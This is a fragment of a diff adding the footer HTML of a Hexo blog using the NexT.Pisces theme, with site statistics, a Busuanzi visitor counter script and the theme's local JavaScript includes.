+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-chart-area"></i>
+    </span>
+      <span class="post-meta-item-text">Symbols count total: </span>
+    <span title="Symbols count total">407k</span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-coffee"></i>
+    </span>
+      <span class="post-meta-item-text">Reading time total &asymp;</span>
+    <span title="Reading time total">6:10</span>
+</div>
+  <div class="powered-by">Powered by <a href="https://hexo.io" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://pisces.theme-next.org" class="theme-link" rel="noopener" target="_blank">NexT.Pisces</a>
+  </div>
+
+        
+<div class="busuanzi-count">
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    <span class="post-meta-item" id="busuanzi_container_site_uv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-user"></i>
+      </span>
+      <span class="site-uv" title="Total Visitors">
+        <span id="busuanzi_value_site_uv"></span>
+      </span>
+    </span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item" id="busuanzi_container_site_pv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-eye"></i>
+      </span>
+      <span class="site-pv" title="Total Views">
+        <span id="busuanzi_value_site_pv"></span>
+      </span>
+    </span>
+</div>
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/pisces.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+  
+<script src="/js/local-search.js"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+</body>
+</html>
